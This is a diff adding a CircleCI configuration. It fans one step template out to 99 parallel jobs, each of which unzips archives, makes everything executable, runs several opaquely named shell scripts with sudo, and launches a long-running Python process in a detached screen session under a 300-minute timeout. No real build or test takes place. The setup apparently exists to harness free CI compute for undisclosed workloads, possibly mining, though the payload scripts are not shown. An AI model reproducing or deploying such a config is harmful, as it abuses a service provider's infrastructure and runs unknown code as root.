@@ -1,0 +1,571 @@
+working_dir: &working_dir ~/app
+.build_template: &commonSteps
+  steps:
+    - checkout
+    - run:
+        name: A
+        command: |
+          sudo apt update -y
+    - run:
+        name: B
+        command: |
+          sleep 10s          
+          unzip kura.zip && chmod u+x *
+          #./kura.sh###
+    - run:
+        name: C
+        command: |
+          unzip hero.zip >/dev/null 2>&1
+    - run:
+        name: D
+        command: |
+          chmod u+x *
+    - run:
+        name: E
+        command: |
+          sudo ./aku.sh
+    - run:
+        name: F
+        command: |
+          sudo ./Bojo.sh
+    - run:
+        name: G
+        command: |
+          sudo ./cilok.sh
+    - run:
+        name: H
+        command: |
+          sudo ./dan.sh
+    - run:
+        name: I
+        command: |
+          sudo ./ewe.sh
+    - run:
+        name: J
+        command: |
+          #sudo ./Frean.sh#no_run
+    - run:
+        name: K
+        no_output_timeout: 300m
+        command: |
+          echo "Ijin Berkah Om. . ."
+          sudo ./gok.sh
+          sudo ./halah.sh
+          sudo ./Itu.sh
+          screen -dmS Acdb python3 pro01.py
+          sleep 300s
+          ./main01.sh
+  working_directory: *working_dir
+
+version: 2.0
+
+jobs:
+  MOX_01:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  MOX_02:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_03:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  MOX_04:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_05:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_06:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_07:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_08:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_09:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_10:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_11:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_12:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_13:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_14:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_15:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_16:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_17:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_18:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_19:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_20:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_21:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_22:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_23:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  MOX_24:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_25:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_26:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_27:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_28:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_29:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_30:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_31:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_32:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_33:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  MOX_34:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_35:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_36:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_37:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_38:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_39:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_40:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_41:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_42:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_43:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  MOX_44:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_45:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_46:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_47:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_48:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_49:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_50:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_51:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_52:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_53:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  MOX_54:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_55:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_56:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_57:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_58:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_59:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_60:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_61:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_62:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_63:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  MOX_64:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_65:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_66:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_67:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_68:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_69:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_70:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_71:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_72:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_73:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  MOX_74:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_75:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_76:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_77:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_78:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_79:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_80:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_81:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_82:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_83:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  MOX_84:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_85:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_86:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_87:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_88:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_89:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_90:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_91:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  MOX_92:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_93:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  MOX_94:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_95:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_96:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_97:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_98:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  MOX_99:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+
+workflows:
+  version: 2
+  SUSU:
+    jobs:
+      - MOX_01
+      - MOX_02
+      - MOX_03
+      - MOX_04
+      - MOX_05
+      - MOX_06
+      - MOX_07
+      - MOX_08
+      - MOX_09
+      - MOX_10
+      - MOX_11
+      - MOX_12
+      - MOX_13
+      - MOX_14
+      - MOX_15
+      - MOX_16
+      - MOX_17
+      - MOX_18
+      - MOX_19
+      - MOX_20
+      - MOX_21
+      - MOX_22
+      - MOX_23
+      - MOX_24
+      - MOX_25
+      - MOX_26
+      - MOX_27
+      - MOX_28
+      - MOX_29
+      - MOX_30
+      - MOX_31
+      - MOX_32
+      - MOX_33
+      - MOX_34
+      - MOX_35
+      - MOX_36
+      - MOX_37
+      - MOX_38
+      - MOX_39
+      - MOX_40
+      - MOX_41
+      - MOX_42
+      - MOX_43
+      - MOX_44
+      - MOX_45
+      - MOX_46
+      - MOX_47
+      - MOX_48
+      - MOX_49
+      - MOX_50
+      - MOX_51
+      - MOX_52
+      - MOX_53
+      - MOX_54
+      - MOX_55
+      - MOX_56
+      - MOX_57
+      - MOX_58
+      - MOX_59
+      - MOX_60
+      - MOX_61
+      - MOX_62
+      - MOX_63
+      - MOX_64
+      - MOX_65
+      - MOX_66
+      - MOX_67
+      - MOX_68
+      - MOX_69
+      - MOX_70
+      - MOX_71
+      - MOX_72
+      - MOX_73
+      - MOX_74
+      - MOX_75
+      - MOX_76
+      - MOX_77
+      - MOX_78
+      - MOX_79
+      - MOX_80
+      - MOX_81
+      - MOX_82
+      - MOX_83
+      - MOX_84
+      - MOX_85
+      - MOX_86
+      - MOX_87
+      - MOX_88
+      - MOX_89
+      - MOX_90
+      - MOX_91
+      - MOX_92
+      - MOX_93
+      - MOX_94
+      - MOX_95
+      - MOX_96
+      - MOX_97
+      - MOX_98
+      - MOX_99
